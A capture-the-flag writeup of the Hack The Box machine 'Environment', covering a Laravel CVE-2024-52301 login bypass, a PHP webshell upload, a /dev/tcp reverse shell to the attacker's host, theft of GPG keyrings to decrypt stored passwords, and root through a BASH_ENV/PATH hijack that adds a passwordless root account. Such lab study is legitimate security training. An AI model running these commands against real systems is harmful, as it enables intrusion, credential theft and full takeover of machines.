---
title: HTB Environment - Writeup
date: 2025-07-13 18:02:00 +0330
categories: [Writeup]
tags: [cve]
description: My writeup of Environment from Hack The Box

---

![infocard](assets/img/environment.png)

## - **Introduction**
In order to get a foothold, we will use a weakness in the laravel version to bypass login and upload a reverse shell as the user picture.

## - **Recon & Enum**
##### Port Scanning
Scanning ports using Nmap:
```shell
$ nmap -sC -sV -oN environment_nmap --min-rate=1000 -p- 10.10.11.67
```

```
Nmap scan report for 10.10.11.67
Host is up (0.97s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I also started checking for directories with gobuster
```
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://environment.htb/                 
```
From which I discovered `/upload` directory, with a `405 method not allowed` code, a lovely debug enabled laravel page and some beautiful version info! `PHP 8.2.28` and `Laravel 11.30.0`.  
After some research it appears the laravel version is vulnerable to [CVE-2024-52301](https://github.com/Nyamort/CVE-2024-52301), meaning we can manipulate environment variables.
##### Bypass login page
We can see another debug page with useful information in `/login` when we leave the `remember` option empty. From there we learn the production environment is called `preprod`.

![](assets/img/environment_login.png)
![](assets/img/environment_debug.png)

So now we can bypass the login and go to the dashboard.
![](assets/img/environment_preprod.png)

## - **Foothold**

This part is a bit tricky, as you can see the reverse shell payload worked to some extent but the connection closes immediately. I got some help from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)

![](assets/img/environment_fail.png)

```shell
$ nc -nvlp 9070  
```

``` 
listening on [any] 9070 ...
connect to [10.10.14.126] from (UNKNOWN) [10.10.11.67] 38448
```

I decided to use a webshell and it worked!

![](assets/img/environment_burp_webshell.png)
![](assets/img/environment_id.png)

And the reverse shell.

```shell
$ curl -G "http://environment.htb/storage/files/payload.php" -d "cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.126%2F9070%200%3E%261'"
```

```
www-data@environment:~/app/storage/app/public/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## - **User**
We can access `/home/hish` and read the user flag.

```
www-data@environment:/home/hish$ cat user.txt
cat user.txt 
b9c964d*************db3d482ffebe
```

In order to get the password of user `hish`, we have to send `backup/keyvault.gpg` and `.gnupg` to our own machine.

```
www-data@environment:/home/hish$ ls backup
ls backup
keyvault.gpg
www-data@environment:/home/hish$ ls -la
ls -la
total 40
drwxr-xr-x 5 hish hish 4096 Jul 16 19:08 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Jul 16 23:30 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rwxr-xr-x 1 hish hish    8 Jul 16 19:08 exp.sh
-rw-r--r-- 1 root hish   33 Jul 16 18:41 user.txt
```

We will make a `tar` archive of `.gnupg` folder for easy transfer.
```shell
www-data@environment:/home/hish$ tar -cf /tmp/gnupg.tar .gnupg
```

After sending the files to ourself, we should first create a backup of our own `.gnupg` floder and replace it with the victim's file.
Now we can decrypt `keyvault.gpg`.
```
$ gpg --decrypt keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> ****************
FACEBOOK.COM -> summerSunnyB3ACH!!
```

And now time for ssh.
```
hish@environment:~$ id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

## - **Root**

We can see there is one script we can run as sudo. The script uses some binaries without correctly including paths and we are able to manipulate `PATH` variable. Also `env_keep+="ENV BASH_ENV"` will help us pass `PATH` variable through sudo.

```
hish@environment:~$ sudo -l
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV
    BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
hish@environment:~$ cat /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```


After some testing, using `dmesg` works and I'll only include that here.

```
hish@environment:~$ cat dmesg
/bin/bash
```

>Don't forget to make the decoy file executable
{: .prompt-warning }

And a env file to pass as the value of `BASH_ENV`.
```
hish@environment:~$ cat /tmp/new_env.sh 
#!/bin/bash
PATH=/home/hish:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Everything done, now for the fun part!

```
hish@environment:~$ sudo BASH_ENV=/tmp/new_env.sh /usr/bin/systeminfo

### Displaying kernel ring buffer logs (dmesg) ###
root@environment:/home/hish#
root@environment:/home/hish# echo "my_root::0:0:root:/root:/bin/bash" >> /etc/passwd
```

>Note that we can't see the output of commands. Though you can do many things, I just added a `my_root` user.
{: .prompt-info }

```
hish@environment:~$ su my_root
root@environment:/home/hish# cd
root@environment:~# cat root.txt   
53d934d75****************dc9fa85
root@environment:~# 
```

BOOM we got r00t!

![](assets/img/environment_congrats.png)

Thanks for reading!